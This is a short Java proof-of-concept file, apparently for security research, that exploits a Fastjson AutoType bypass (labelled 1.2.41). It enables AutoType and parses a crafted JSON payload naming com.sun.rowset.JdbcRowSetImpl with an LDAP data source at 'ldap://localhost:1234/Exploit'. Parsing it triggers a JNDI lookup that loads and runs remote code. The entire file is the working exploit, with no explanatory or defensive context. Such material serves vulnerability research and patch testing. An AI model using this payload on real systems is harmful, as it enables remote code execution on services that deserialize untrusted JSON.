import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

// Fastjson 1.2.41 版本的绕过
public class SuccessBypassEXP_43 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload ="{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://localhost:1234/Exploit\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
